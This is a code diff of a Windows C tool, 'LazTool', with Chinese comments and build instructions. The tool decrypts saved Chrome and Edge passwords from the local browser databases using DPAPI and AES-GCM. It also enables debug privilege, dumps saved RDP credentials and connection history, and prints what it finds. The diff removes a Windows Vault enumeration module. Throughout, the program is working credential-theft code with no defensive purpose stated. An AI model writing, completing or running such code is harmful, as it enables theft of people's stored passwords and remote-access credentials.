@@ -1,6 +1,6 @@
-// file: advanced_features.c
-// compile: x64 Native Tools Command Prompt -> cl /O2 /MT /Fe:AdvTool.exe advanced_features.c sqlite3.c /link wlanapi.lib dbghelp.lib credui.lib crypt32.lib
-// run: Administrator
+// file: laztool_advanced.c
+// 编译: x64 Native Tools Command Prompt -> cl /O2 /MT /Fe:LazTool.exe laztool_advanced.c sqlite3.c /link wlanapi.lib dbghelp.lib credui.lib crypt32.lib bcrypt.lib
+// 运行: 必须以管理员身份运行
 
 #define _WIN32_WINNT 0x0601
 #include <windows.h>
@@ -25,13 +25,65 @@
 #define WLAN_PROFILE_GET_PLAINTEXT 0x00000002
 #endif
 
-// --- 辅助函数 (管理员权限检查等，与之前相同，此处略)
-BOOL IsElevated() { /* ... 与之前相同 ... */ }
-BOOL EnableDebugPrivilege() { /* ... 与之前相同 ... */ }
-DWORD GetProcessPid(const wchar_t* procName) { /* ... 与之前相同 ... */ }
+// --------------------- 辅助函数 ---------------------------------
+BOOL IsElevated() {
+    BOOL fRet = FALSE;
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        TOKEN_ELEVATION Elevation = {0};
+        DWORD dwSize = sizeof(TOKEN_ELEVATION);
+        if (GetTokenInformation(hToken, TokenElevation, &Elevation, dwSize, &dwSize))
+            fRet = Elevation.TokenIsElevated;
+        CloseHandle(hToken);
+    }
+    return fRet;
+}
 
-// ---------------- 模块5: Chromium 浏览器密码解密 ----------------
-// 解密 DPAPI Blob 数据
+BOOL EnableDebugPrivilege() {
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return FALSE;
+    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
+        CloseHandle(hToken);
+        return FALSE;
+    }
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
+        CloseHandle(hToken);
+        return FALSE;
+    }
+    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
+        CloseHandle(hToken);
+        return FALSE;
+    }
+    CloseHandle(hToken);
+    return TRUE;
+}
+
+DWORD GetProcessPid(const wchar_t* procName) {
+    DWORD pid = 0;
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(pe);
+        if (Process32FirstW(snapshot, &pe)) {
+            do {
+                if (_wcsicmp(pe.szExeFile, procName) == 0) {
+                    pid = pe.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(snapshot, &pe));
+        }
+        CloseHandle(snapshot);
+    }
+    return pid;
+}
+
+// --------------------- 模块：Chromium 密码解密 --------------------
 BYTE* DecryptDPAPIBlob(BYTE* pEncryptedData, DWORD dwDataSize, DWORD* pdwOutSize) {
     DATA_BLOB DataIn, DataOut;
     DataIn.pbData = pEncryptedData;
@@ -43,7 +95,6 @@ BYTE* DecryptDPAPIBlob(BYTE* pEncryptedData, DWORD dwDataSize, DWORD* pdwOutSize
     return DataOut.pbData;
 }
 
-// AES-GCM 解密
 BOOL AesGcmDecrypt(const BYTE* key, DWORD keyLen, const BYTE* iv, DWORD ivLen,
     const BYTE* ciphertext, DWORD ciphertextLen, BYTE* plaintext, DWORD* plaintextLen) {
     BCRYPT_ALG_HANDLE hAlg = NULL;
@@ -69,14 +120,17 @@ cleanup:
     return bResult;
 }
 
-void ExtractChromePasswords(const wchar_t* browserPath, const wchar_t* browserName) {
+void ExtractChromePasswords(const wchar_t* userDataPath, const wchar_t* browserName) {
     wchar_t localStatePath[MAX_PATH];
-    wcscpy_s(localStatePath, browserPath);
-    wcscat_s(localStatePath, L"\\Local State");
+    wcscpy_s(localStatePath, MAX_PATH, userDataPath);
+    wcscat_s(localStatePath, MAX_PATH, L"\\Local State");
 
     // 1. 读取 Local State 文件
     HANDLE hFile = CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return;
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[!] %S not found or inaccessible.\n", browserName);
+        return;
+    }
     DWORD fileSize = GetFileSize(hFile, NULL);
     char* jsonData = (char*)malloc(fileSize + 1);
     DWORD bytesRead = 0;
@@ -110,8 +164,8 @@ void ExtractChromePasswords(const wchar_t* browserPath, const wchar_t* browserNa
 
     // 6. 读取 Login Data 数据库
     wchar_t loginDataPath[MAX_PATH];
-    wcscpy_s(loginDataPath, browserPath);
-    wcscat_s(loginDataPath, L"\\Default\\Login Data");
+    wcscpy_s(loginDataPath, MAX_PATH, userDataPath);
+    wcscat_s(loginDataPath, MAX_PATH, L"\\Default\\Login Data");
 
     sqlite3* db;
     if (sqlite3_open16(loginDataPath, &db) == SQLITE_OK) {
@@ -148,10 +202,9 @@ void ExtractChromePasswords(const wchar_t* browserPath, const wchar_t* browserNa
     free(jsonData);
 }
 
-// ---------------- 模块6: RDP 保存密码提取 ----------------
+// --------------------- 模块：RDP 保存密码 --------------------
 void DumpRDPCredentials() {
     printf("\n[+] ===== RDP Saved Credentials =====\n");
-    // 方法1: 使用 CredEnumerate API
     PCREDENTIALW* pCreds = NULL;
     DWORD dwCount = 0;
     if (CredEnumerateW(NULL, 0, &dwCount, &pCreds)) {
@@ -174,7 +227,6 @@ void DumpRDPCredentials() {
         printf("[-] CredEnumerate failed with error: %lu\n", GetLastError());
     }
 
-    // 方法2: 从注册表读取 RDP 连接历史
     printf("\n[*] RDP Connection History (from registry):\n");
     HKEY hKey;
     if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Terminal Server Client\\Servers", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
@@ -189,58 +241,7 @@ void DumpRDPCredentials() {
     }
 }
 
-// ---------------- 模块7: Windows Vault 凭据提取 ----------------
-// Vault API 函数指针定义
-typedef DWORD(WINAPI* pVaultEnumerateVaults)(DWORD, DWORD*, GUID**);
-typedef DWORD(WINAPI* pVaultOpenVault)(GUID*, DWORD, HANDLE*);
-typedef DWORD(WINAPI* pVaultCloseVault)(HANDLE);
-typedef DWORD(WINAPI* pVaultEnumerateItems)(HANDLE, DWORD, DWORD*, PVOID*);
-typedef DWORD(WINAPI* pVaultFree)(PVOID);
-typedef DWORD(WINAPI* pVaultGetItem)(HANDLE, GUID*, PVOID, DWORD, DWORD, PVOID*);
-
-void DumpWindowsVault() {
-    printf("\n[+] ===== Windows Vault Credentials =====\n");
-    HMODULE hVault = LoadLibraryW(L"vaultcli.dll");
-    if (!hVault) {
-        printf("[-] Failed to load vaultcli.dll\n");
-        return;
-    }
-
-    pVaultEnumerateVaults VaultEnumerateVaults = (pVaultEnumerateVaults)GetProcAddress(hVault, "VaultEnumerateVaults");
-    pVaultOpenVault VaultOpenVault = (pVaultOpenVault)GetProcAddress(hVault, "VaultOpenVault");
-    pVaultCloseVault VaultCloseVault = (pVaultCloseVault)GetProcAddress(hVault, "VaultCloseVault");
-    pVaultEnumerateItems VaultEnumerateItems = (pVaultEnumerateItems)GetProcAddress(hVault, "VaultEnumerateItems");
-    pVaultFree VaultFree = (pVaultFree)GetProcAddress(hVault, "VaultFree");
-    pVaultGetItem VaultGetItem = (pVaultGetItem)GetProcAddress(hVault, "VaultGetItem");
-
-    if (!VaultEnumerateVaults || !VaultOpenVault || !VaultEnumerateItems) {
-        printf("[-] Failed to get Vault API functions\n");
-        FreeLibrary(hVault);
-        return;
-    }
-
-    GUID* pVaults = NULL;
-    DWORD dwVaults = 0;
-    if (VaultEnumerateVaults(0, &dwVaults, &pVaults) == 0 && dwVaults > 0) {
-        for (DWORD i = 0; i < dwVaults; i++) {
-            HANDLE hOpenedVault = NULL;
-            if (VaultOpenVault(&pVaults[i], 0, &hOpenedVault) == 0) {
-                PVOID pItems = NULL;
-                DWORD dwItems = 0;
-                if (VaultEnumerateItems(hOpenedVault, 0, &dwItems, &pItems) == 0 && dwItems > 0) {
-                    // 这里可以进一步解析每个凭据项，为简化示例，仅提示
-                    printf("[*] Found %lu items in vault %d\n", dwItems, i);
-                }
-                if (pItems) VaultFree(pItems);
-                VaultCloseVault(hOpenedVault);
-            }
-        }
-        VaultFree(pVaults);
-    }
-    FreeLibrary(hVault);
-}
-
-// ---------------- 主函数 ----------------
+// --------------------- 主函数：构造用户目录并调用 --------------------
 int main() {
     SetConsoleOutputCP(CP_UTF8);
     printf("=========================================================\n");
@@ -252,13 +253,23 @@ int main() {
         return 1;
     }
 
-    // 调用新模块
-    printf("\n[+] ===== Module: Chromium Password Extraction =====\n");
-    ExtractChromePasswords(L"C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data", L"Chrome");
-    ExtractChromePasswords(L"C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data", L"Edge");
+    // 获取当前用户的 AppData Local 路径
+    wchar_t appDataLocal[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataLocal))) {
+        wchar_t chromePath[MAX_PATH];
+        wcscpy_s(chromePath, MAX_PATH, appDataLocal);
+        wcscat_s(chromePath, MAX_PATH, L"\\Google\\Chrome\\User Data");
+        ExtractChromePasswords(chromePath, L"Chrome");
+
+        wchar_t edgePath[MAX_PATH];
+        wcscpy_s(edgePath, MAX_PATH, appDataLocal);
+        wcscat_s(edgePath, MAX_PATH, L"\\Microsoft\\Edge\\User Data");
+        ExtractChromePasswords(edgePath, L"Edge");
+    } else {
+        printf("[-] Failed to get AppData path.\n");
+    }
 
     DumpRDPCredentials();
-    DumpWindowsVault();
 
     printf("\n[*] Execution completed.\n");
     return 0;
